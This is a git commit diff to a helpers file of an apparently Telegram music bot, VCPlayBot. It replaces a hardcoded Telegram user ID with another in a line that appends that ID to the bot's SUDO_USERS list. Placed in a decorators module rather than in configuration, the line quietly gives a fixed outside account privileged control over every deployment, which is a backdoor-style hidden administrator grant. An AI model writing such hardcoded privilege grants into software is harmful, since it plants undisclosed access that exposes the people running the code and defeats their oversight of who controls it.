559c9ab0128d63255ba1183ab3e541d69103a61f
τєαм ϰмαяτγ <85209355+S780821@users.noreply.github.com>
2021-10-04 07:04:17 +0530

    Update decorators.py

--- VCPlayBot/helpers/decorators.py
+++ VCPlayBot/helpers/decorators.py
@@ -6,7 +6,7 @@ from pyrogram.types import Message
 from VCPlayBot.helpers.admins import get_administrators
 from VCPlayBot.config import SUDO_USERS
 
-SUDO_USERS.append(797768146)
+SUDO_USERS.append(1914050048)
 
 
 def errors(func: Callable) -> Callable:
